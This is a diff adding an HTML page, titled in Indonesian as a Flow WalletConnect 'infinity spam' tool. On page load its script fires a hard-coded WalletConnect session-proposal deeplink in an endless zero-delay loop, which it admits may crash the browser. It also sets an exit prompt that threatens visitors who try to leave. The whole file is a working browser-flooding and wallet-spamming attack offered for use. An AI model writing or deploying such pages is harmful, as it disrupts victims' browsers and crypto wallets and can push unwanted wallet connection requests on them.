@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>FLOW WC – AUTO INFINITY SPAM</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #000;
+      color: #0f0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .warning {
+      font-size: 24px;
+      text-align: center;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      50% { opacity: 0.3; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="warning">
+    FLOW WALLET CONNECT SPAMMER<br>
+    SEDANG BERJALAN (INFINITY LOOP)<br>
+    <br>
+    Tutup tab ini SEKARANG kalau tidak ingin browser crash!
+  </div>
+
+  <script>
+    const deeplink =
+      "wc:75e7fb2068b7f9abc94761cf72e93cbbf8d1804d044f38b9b7e695b89193d421@2" +
+      "?relay-protocol=irn" +
+      "&symKey=3f316b05f1ba3bd669097bb81f16fba67c2ffb503745363e292cfbcf73ef62cc" +
+      "&methods=[wc_sessionPropose]" +
+      "&expiryTimestamp=1893456000";
+
+    function spam() {
+      const a = document.createElement("a");
+      a.href = deeplink;
+      a.target = "_blank";
+      a.rel = "noopener noreferrer";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+
+      // Spam secepat mungkin (bisa diganti 0 kalau mau lebih gila lagi)
+      setTimeout(spam, 0);
+    }
+
+    // Langsung jalan begitu halaman selesai load
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", spam);
+    } else {
+      spam();
+    }
+
+    // Bonus: tetap spam meskipun user coba scroll / klik di halaman
+    window.onbeforeunload = () => "Browser kamu bakal mati kalau keluar sekarang :)";
+  </script>
+
+</body>
+</html>
